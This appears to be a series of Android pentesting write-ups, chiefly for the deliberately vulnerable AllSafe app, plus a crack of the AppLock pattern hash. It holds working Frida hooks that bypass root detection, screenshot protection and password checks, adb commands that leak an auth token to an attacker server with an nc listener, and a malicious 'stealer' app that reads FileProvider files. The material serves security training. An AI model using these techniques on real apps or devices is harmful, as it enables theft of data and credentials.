            || checkForMagiskBinary();          // magisk binary exists on device?
    }
  • We don't care about those checks we only have to hook on isRooted and force its return value to be false
    Java.perform(function() {
        var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    
        RootBeer.isRooted.implementation = function() {
            console.log("[*] isRooted() hooked → returning false");
            return false;  // device appears clean to the app
        };
    });

8. Secure Flag Bypass​

Objective​

  • FLAG_SECURE is a Windows flag set by the app on its MainActivity
    getWindow().setFlags(
        WindowManager.LayoutParams.FLAG_SECURE,
        WindowManager.LayoutParams.FLAG_SECURE
    );

This prevents:

  • Taking screenshots
  • Screen recording
  • Appearing in the recent apps preview
  • It is not a vulnerability, it's a privacy protection feature. The challenge is just using it as a Frida practice target.

Bypass with Frida​

Java.perform(function() {
    var Window = Java.use("android.view.Window");

    Window.setFlags.implementation = function(flags, mask) {
        // remove FLAG_SECURE (value = 8192) before it gets set
        flags = flags & ~8192;
        mask  = mask  & ~8192;
        this.setFlags(flags, mask);
        console.log("[*] FLAG_SECURE removed");
    };
});
  • Or use the codeshare directly:

frida --codeshare eiliyakeshtkar0/screenshot-protection -f com.example.allsafe

9. Deep Link​

Objective:​

Solution:​

  • The app contains a hidden activity that can only be unlocked via a specific Deep Link. The goal is to find the correct URI and the required secret key.

  • Search the AndroidManifest.xml for keywords like data, browsable, or android.intent.action.VIEW. This reveals the Deep Link configuration:

  • Browsing the DeepLinkTask class reveals the validation logic:

Intent intent = getIntent();
Uri data = intent.getData();

// Extracts the "key" parameter from the URI
if (data.getQueryParameter("key").equals(getString(R.string.key))) {
    // Successfully unlocks the challenge
    SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
}

  • By checking strings.xml the key is: ebfb7ff0-b2f6-41c8-bef3-4fba17be410c

  • The data format for a Deep Link is scheme://host:port/path?query Combining the manifest data and the discovered key, we can construct the exploit URI: allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c

  • Now we can trigger deep link via ADB

    adb shell am start \
      -n infosecadventures.allsafe/.challenges.DeepLinkTask \
      -a android.intent.action.VIEW \
      -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
  • Solved

10. Insecure Broadcast Receiver​

Objective​

Steps​

Receiver Type

  • Static → defined in AndroidManifest.xml
  • Dynamic Receivers → function registerReceiver

  • in this challenge there is a receiver defined in manifest

    • exported="true" + no android:permission → anyone can trigger it
    • Action: infosecadventures.allsafe.action.PROCESS_NOTE

  • reviewing the NoteReceibver code , this code takes 3 extras

    public class NoteReceiver extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            String server = intent.getStringExtra("server");
            String note = intent.getStringExtra("note");
            String notification_message = intent.getStringExtra("notification_message");
            OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
            HttpUrl httpUrl = new HttpUrl.Builder().scheme("http").host(server).addPathSegment("api").addPathSegment("v1").addPathSegment("note").addPathSegment("add").addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=").addQueryParameter("note", note).build();
            Log.d("ALLSAFE", httpUrl.getUrl());
            Request request = new Request.Builder().url(httpUrl).build();
  • server Used as Host in the HTTP URL → attacker controlled
  • note Used as query parameter
  • notification_message Received but unused
  • Then uses those extras to send Https request the resulting URL **http://<server>/api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=<note>**
  • The Problem here there is Unvalidated server extra so attacker sends a broadcast to a server under his control, the app makes HTTP request to this server —> Auth token leaks in URL.

💡

Permission re-delegation is a security vulnerability in which a malicious application exploits another application that has higher privileges to perform actions or access data that it would not normally be allowed to access.

in this example

  • We can exploit this with adb
    adb shell am broadcast \
      -a infosecadventures.allsafe.action.PROCESS_NOTE \
      -n infosecadventures.allsafe/.challenges.NoteReceiver \
      --es server "10.0.2.2" \
      --es note "hacked" \
      --es notification_message "x"
  • The attacker start a listener on his machine nc -lvnp 80 , will receive something like this GET /api/v1/note/add?auth_token=YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=&note=hacked ,
  • just decode it echo "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=" | base64 -d —> allsafe_dev_admin_token

11. Vulnerable Webview​

Objective​

  • Reviewing code reveals

  • Because of setJavaScripptEnabled

  • Because of setAllowFileAccess: it supports File schema we can review internal files like /etc/hosts

12. Certificate Pinning​

💡

SSL pinning (certificate pinning) forces an app to trust only specific certificates or public keys instead of any certificate signed by a trusted CA. Even if an attacker installs a custom CA (like Burp Suite's), the app rejects the TLS handshake — because the cert doesn't match the hardcoded pin.

Used Objection to bypass SSL Pinning

objection -n infosecadventures.allsafe start
android sslpinning disable

item.title: AllSafe - Part 3
item.description: AllSafe Part 3 covers challenges 14–18: Weak Crypto, Insecure Service, Object Serialization, Insecure Provider, and Native Library.
item.content:encoded:
AllSafe Part 3 covers challenges 14–18: Weak Crypto, Insecure Service, Object Serialization, Insecure Provider, and Native Library.

13. Weak Crypto​

  • Just used this script from frida codeshare
    frida --codeshare fadeevab/intercept-android-apk-crypto-operations -U -f package_name

  • Once a crypto operation is detected, view it with all info we need

14. Insecure Service​

Objective:​

Solution:​

  • The app has a recording service, once you click START SERVICE, the message Audio recording started! appears and audio recording runs in the background for a second, then the recorded audio is stored in /storage/emulated/0/Download/allsafe_rec_<Date>.mp3

  • Decompile the APK and search for Audio recording started! — this leads to RecorderService class

    private File getOutputFile() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
        String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
        Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
        return new File(fullPath);
    }

  • This code confirms the file path format shown earlier.

  • Checking AndroidManifest.xml — the service has android:exported="true", so we can trigger it externally via ADB without any user interaction

  • Since we know the file location, we can start the recording and steal the file.

    a54x:/ # cd /storage/emulated/0/Download
    a54x:/storage/emulated/0/Download # ls
    allsafe_rec_20260407_012729078.mp3  allsafe_rec_20260407_012950865.mp3  ...  flag.txt
    a54x:/storage/emulated/0/Download # cat flag.txt
    76400a3229290e7d6ada977227f9ecc3

15. Object Serialization​

What is Serialization​

  • A Java object lives in RAM. When the app closes, RAM is wiped —> the object is gone.
  • Serialization = converting a live object into a sequence of bytes so it can be saved to disk or sent over the network.
  • Deserialization = reading those bytes back and reconstructing the object.

Example:​

  • Training a model takes hours. After training, you serialize it to model.pkl. Next time, you just load it —> no re-training needed.

Challenge​

Steps​

  • Opening the APK in JADX, the challenge logic is inside onCreateView in the ObjectSerialization fragment. There are two button listeners: save and load.

  • The save listener creates a User object from the UI fields and serializes it to user.dat on external storage using Java's built-in ObjectOutputStream:

    User user = new User(username.getText().toString(), password.getText().toString());
    
    File file = new File(path);
    FileOutputStream fos = new FileOutputStream(file);
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(user);  // converts the User object → bytes → writes to file
    
    oos.close();
    fos.close();
  • FileOutputStream — opens the file for writing raw bytes.
  • ObjectOutputStream — wraps it and adds the serialization logic: it reads every field in the User object and encodes them into a structured byte stream.
  • writeObject(user) — triggers the conversion: Java walks through all fields (username, password, role) and writes their values as bytes into user.dat.
  • Viewing User class, role is hardcoded default value.
    public static class User implements Serializable {
        String username;
        String password;
        String role = "ROLE_AUTHOR";  // hardcoded default, always this
    }
  • The User class implements Serializable — a marker interface with no methods. It's just a tag that tells the Java runtime "this object is allowed to be serialized". Without it, writeObject() throws a NotSerializableException
  • Lets explain how deserialization is implemented, The load listener reads user.dat back using ObjectInputStream and reconstructs the User object from the bytes:
    File file = new File();
    FileInputStream fis = new FileInputStream(file);
    ObjectInputStream ois = new ObjectInputStream(fis);
    User user = (User) ois.readObject();  // reads bytes → reconstructs User object
    
    ois.close();
    fis.close();
  • readObject() — triggers the reconstruction: Java reads the bytes from user.dat and maps them back into a User object with all its fields restored exactly as they were when saved — including role.
  • After reconstruction, the app makes a security decision based on the role field from the deserialized object:
    if (!user.role.equals("ROLE_EDITOR")) {
        // "Sorry, only editors have access!"
    } else {
        // "Good job!"
    }
  • The problem here is that the app never verifies that the file came from itself or that it was not tampered with. It blindly trusts whatever role value is inside the bytes.
  • Since We know the path is on external storage /sdcard/Android/data/infosecadventures.allsafe/files/user.dat , we can access file and modify Role.
    final String path = requireActivity().getExternalFilesDir(null) + "/user.dat";

  • To can edit the role, first pull user.dat file into my kali machine adb pull /sdcard/Android/data/infosecadventures.allsafe/files/user.dat

  • I used sed to edit role to editor sed -i 's/ROLE_AUTHOR/ROLE_EDITOR/' user.dat

  • Then push user.dat back to device, now we can load data

16. Insecure Provider​

Objective​

Steps​

  • Opened AndroidManifest.xml in JADX, searched for <provider> tags and found two DataProvider → exported="true" , and FileProvider → exported="false"

  • Opened DataProvider.java and examined the two key methods:

    • onCreate():
        public boolean onCreate() {
            this.noteDatabaseHelper = new NoteDatabaseHelper(getContext());
            uriMatcher.addURI("infosecadventures.allsafe.dataprovider", "note", 123);
            return false;
        }
  • query():
        public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
            SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
            queryBuilder.setTables("note");
            return queryBuilder.query(this.noteDatabaseHelper.getReadableDatabase(), projection, selection, selectionArgs, null, null, sortOrder);
        }
  • uriMatcher registered in onCreate() but never called in query() , URI path is completely ignored — any path works, not just /note
  • No checkCallingPermission() or enforceReadPermission() , Any app or ADB can call this provider freely

💡

Content Provider URIs follow this structure:

From manifest

  • We can query this DataProvider with adb to get all notes adb shell content query —uri content://infosecadventures.allsafe.dataprovider

  • Because query() never checks the URI path, even a garbage path works:

    adb shell content query --uri content://infosecadventures.allsafe.dataprovider/anything

2nd Provider FileProvider​

  • As we see this Provider isn't exported,

  • exported="false" = no outside app can access the provider at all.
  • grantUriPermissions="true" = adds one exception: the app can temporarily share a single specific file with another app via an Intent flag.
  • provider_paths the whitelist: Tells FileProviderwhich folders it's allowed to share files from. It will refuse to generate a URI for any file outside these folders.
Path Types Reference
Path TypePoints ToNotes
<files-path>/data/data/com.app/files/App's private internal storage
<cache-path>/data/data/com.app/cache/Temporary files, can be deleted by Android
<external-path>/sdcard/Public shared storage
<external-files-path>/sdcard/Android/data/com.app/files/Private folder on SD card, deleted on uninstall
<external-cache-path>/sdcard/Android/data/com.app/cache/Temporary files on SD card
<root-path>/Dangerous — entire filesystem
  • In Our challenge, the res/xml/Provider_Paths.xml file
    <?xml version="1.0" encoding="utf-8"?>
    <paths>
        <files-path
            name="files"
            path="."/>
    </paths>
  • <files-path> → base is /data/data/infosecadventures.allsafe/files/
  • path="." → everything inside that folder is allowed
  • name="files" → alias used in the generated URI

So a file at:

/data/data/infosecadventures.allsafe/files/

Gets shared as:

content://infosecadventures.allsafe.fileprovider/files/secret.txt

  • To be able to read files from FileProvider we have to find another component that forwards intents without validation. Search for these patterns in JADX:
  1. Intent forwarding: Any activity that takes an intent from outside and passes it internally
    startActivity(getIntent().getParcelableExtra("..."))
    startActivityForResult(getIntent().getParcelableExtra("..."), ...)
  1. URI reading: any activity that receives a URI and opens it
    getIntent().getData()
    getIntent().getParcelableExtra("...")
    getContentResolver().openInputStream(uri)
  1. WebView loading a URI: WebView can render file contents directly — acts as both reader and display.
    webView.loadUrl(uri.toString())
    webView.loadUrl(getIntent().getStringExtra("..."))
  • Here in this challenge I found an exported activity called ProxyActivity that takes an intent as extra
    public class ProxyActivity extends AppCompatActivity {
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
        }

  • In this challenge we can't use ADB as ADB can forward intents via am start, but it has two hard limitations here:

    LimitationWhy
    Can't set FLAG_GRANT_READ_URI_PERMISSION on the inner intentWithout this flag, FileProvider will refuse to serve the file to an outside component
    Can't act as a readerADB has no activity to receive the file URI and call openInputStream() — only code running on the device can do that

    So even if ADB reaches ProxyActivity, the file bytes have nowhere to go.

  • The solution is to write a malicious app with two components:

    1. A trigger (MainActivity) — crafts the nested intent and fires it:
        public void exploit(View view) {
            Intent extra = new Intent();
            extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            extra.setClassName(getPackageName(), "com.example.stealer.steal");
            extra.setData(Uri.parse(
                "content://infosecadventures.allsafe.fileprovider/docs/readme.txt"));
        
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                "infosecadventures.allsafe",
                "infosecadventures.allsafe.ProxyActivity"));
            intent.putExtra("extra_intent", extra);
            startActivity(intent);
        }
  1. stealer activity (com.example.stealer.steal) — the reader that receives the file URI and reads its contents:
        public class steal extends AppCompatActivity {
            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_steal);
        
                try {
                    Log.d("LEAK", IOUtil.toString(
                        getContentResolver().openInputStream(getIntent().getData())
                    ));
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }
  • getIntent().getData() → receives the FileProvider URI forwarded by ProxyActivity
  • getContentResolver().openInputStream() → opens the file stream
  • IOUtil.toString() → reads all bytes to a string

17. Native Library​

Objective​

Steps​

  • Opened the APK in JADX and navigated to the NativeLibrary fragment.
  • Found that the password validation is delegated entirely to a native method
    private final native boolean checkPassword(String password);
    static {
        System.loadLibrary("native_library");
    }

  • The click handler logic is straightforward — if checkPassword() returns false, it shows "Wrong password, try harder!", if true → "That's it! Excellent work!", so we have to make checkPassword() return true.

  • In order to reverse .so file, Decompiled the APK using apktool: apktool d target.apk -o output/ then navigate to output/lib/arm64-v8a/libnative_library.so

  • Loaded libnative_library.so into Ghidra, in functions section, found the mangled JNI export name :Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword

  • The actual password logic lives inside checkPass() — but we don't need to reverse it further. We have the export name, which is enough to hook it directly.

Frida script​

Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"), {
    onEnter: function(args){
        var path = Memory.readUtf8String(args[0]);
        console.log("[*] " + path);
        nhook(path);
    }
});

function nhook(path){
    if (path.indexOf("libnative_library.so") != -1){
        setTimeout(function(){
            var jni = Module.findExportByName("libnative_library.so",
                "Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword");

            Interceptor.attach(jni, {
                onEnter: function(args){},
                onLeave: function(ret){ ret.replace(1); }
            });
        }, 2000);
    }
}
  • Used android_dlopen_ext — a system-level function called whenever a .so is loaded — to detect when our target library is mapped into memory, then attach the hook.
  • Why android_dlopen_ext? — It fires on every .so load. We intercept it, check if the loaded path contains our library name, then set up the real hook.
  • Why setTimeout(..., 2000)? — After dlopen_ext fires, the library needs a moment to fully initialize in memory before findExportByName can resolve its symbols. The delay ensures the module is ready.
  • ret.replace(1) — Replaces the return value of checkPassword with 1 (true) regardless of what checkPass() actually computed.

Running the Hook

frida -U -f infosecadventures.allsafe -l hook.js

item.title: AppLock - Pattern Crack
item.content:encoded:
Objective​

  • Find where the lock pattern is stored in the AppLock app, understand how it's protected, and crack it to retrieve the original pattern.

Steps​

Step 1: Check common storage locations

  • Started with SharedPreferences as it's the most common place apps store settings and credentials:

    adb shell
    cd /data/data/com.domobile.applock/shared_prefs
    cat *

  • Found this interesting entry:

    <string name="image_lock_pattern">agYrmzRS42ZAcYGhv5Lqc+ntTEg=
    </string>
    • The pattern is stored under the key image_lock_pattern
    • The value agYrmzRS42ZAcYGhv5Lqc+ntTEg= looks like Base64 — recognizable by the = padding at the end

Step 2: Decompile and trace the code

  • Decompiled the APK using JADX and searched for image_lock_pattern to understand how the pattern is saved.

  • Found in JADX search results:

    gb.a(this.a, "image_lock_pattern", Base64.encodeToString(d(list), 0));

  • This tells us:

    • The pattern goes through function d(list) first.
    • The result is then Base64 encoded.
    • Then stored in SharedPreferences under image_lock_pattern .

Step 3 — Understand the d() function


static byte[] d(List list) {
    int size = list.size();
    byte[] bArr = new byte[size];

    // Step 1: convert pattern points to bytes
    for (int i = 0; i < size; i++) {
        f fVar = (f) list.get(i);
        bArr[i] = (byte) (fVar.b() + (fVar.a() * 3));
        // each dot = column + (row * 3)
        // dot 0 = top-left, dot 8 = bottom-right
    }

    // Step 2: hash the bytes with SHA-1
    return MessageDigest.getInstance("SHA-1").digest(bArr);
}

What's happening step by step:

  • Each dot on the 3x3 grid is mapped to a number (0–8) based on its position: | 0 | 1 | 2 | | 3 | 4 | 5 | | 6 | 7 | 8 |
  • Those numbers are converted to bytes.
  • The bytes are hashed with SHA-1, The SHA-1 hash is Base64 encoded and stored.
  • The full protection chain: Pattern dots → bytes → SHA-1 hash → Base64 encode → SharedPreferences.

Why it's crackable

  • SHA-1 is a one-way hash — can't be reversed directly
  • BUT the Android pattern only has 9 dots and a very limited number of valid combinations
  • No salt is used — same pattern always produces the same hash
  • This makes it brute-forceable in under a second — try every possible pattern, hash it, compare to the stored hash

Step 4: Crack the pattern

💡

Several tools exist online to crack Android pattern locks automatically. Two well-known ones are APLCracker (the tool used in this writeup) and androidpatternlock

  • Decode Base64 to get the raw SHA-1 hash bytes:

    echo "agYrmzRS42ZAcYGhv5Lqc+ntTEg=" | base64 -d > gesture.key

  • Run APLCracker to brute-force the pattern:

python2 aplc.py gesture.key

## [:D] The pattern has been FOUND!!! => 0124678

## [+] Gesture:
## | 1 | 2 | 3 |
## | 4 |   |   |
## | 5 | 6 | 7 |

💡

A secure implementation would use a modern algorithm like **bcrypt or Argon2** with a random salt, making brute-force computationally infeasible even with the same small keyspace.
